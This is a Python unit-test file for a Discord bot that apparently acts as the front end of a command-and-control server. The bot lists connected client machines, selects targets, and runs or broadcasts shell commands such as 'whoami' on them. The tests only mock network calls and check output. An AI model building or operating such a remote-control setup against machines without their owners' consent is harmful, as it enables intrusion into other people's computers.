import asyncio
import json
import os
import sys
import unittest
import urllib.request
import urllib.error
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

import discord_bot


class DiscordBotDeepCoverageComprehensiveTests(unittest.TestCase):
    """Full production-ready coverage test suite targeting missing lines in discord_bot.py."""

    def test_on_message_events_all_branches(self):
        mock_msg = MagicMock()
        mock_msg.author = "TestAuthor"
        mock_msg.channel.id = discord_bot.DISCORD_CHANNEL_ID
        
        # Async channel.send mock
        async def mock_send(content=None, **kwargs):
            return MagicMock()

        mock_msg.channel.send = mock_send

        # !clients
        mock_msg.content = "!clients"
        with patch("urllib.request.urlopen") as mock_url:
            mock_resp = MagicMock()
            mock_resp.read.return_value = json.dumps({"clients": [{"id": 1, "username": "PC1", "ip": "1.1.1.1"}]}).encode()
            mock_url.return_value.__enter__.return_value = mock_resp
            asyncio.run(discord_bot.on_message(mock_msg))

        # !select
        mock_msg.content = "!select 1"
        asyncio.run(discord_bot.on_message(mock_msg))
        self.assertEqual(discord_bot.TARGET_CLIENT, "1")

        # !ping
        mock_msg.content = "!ping"
        asyncio.run(discord_bot.on_message(mock_msg))

        # !commands
        mock_msg.content = "!commands"
        asyncio.run(discord_bot.on_message(mock_msg))

        # Simple command (!sys)
        mock_msg.content = "!sys"
        with patch("discord_bot.send_commands_to_clients", return_value="System Info Result"):
            asyncio.run(discord_bot.on_message(mock_msg))

        # Param command (!alert msg)
        mock_msg.content = "!alert System Warning"
        with patch("discord_bot.send_commands_to_clients", return_value="Alert Sent"):
            asyncio.run(discord_bot.on_message(mock_msg))

        # Raw CMD (!cmd dir)
        mock_msg.content = "!cmd dir"
        with patch("discord_bot.send_commands_to_clients", return_value="Directory Result"):
            asyncio.run(discord_bot.on_message(mock_msg))

        # Broadcast (!broadcast whoami)
        mock_msg.content = "!broadcast whoami"
        with patch("discord_bot.send_commands_to_clients", return_value="Broadcast Result"):
            asyncio.run(discord_bot.on_message(mock_msg))

        # Unknown command (!unknown)
        mock_msg.content = "!unknown"
        asyncio.run(discord_bot.on_message(mock_msg))

    def test_send_commands_sync_response_branches(self):
        with patch("discord_bot._check_c2_server", return_value=True):
            with patch("urllib.request.urlopen") as mock_url:
                # Test not_found status & success status output formatting
                mock_resp = MagicMock()
                mock_resp.read.return_value = json.dumps({
                    "results": [
                        {"client_id": 1, "username": "Admin", "status": "not_found", "output": ""},
                        {"client_id": 2, "username": "User2", "status": "success", "output": "Output 2"}
                    ]
                }).encode()
                mock_url.return_value.__enter__.return_value = mock_resp

                res = discord_bot._send_commands_sync(["dir"])
                self.assertIn("Not Found", res)
                self.assertIn("Output 2", res)


if __name__ == "__main__":
    unittest.main()
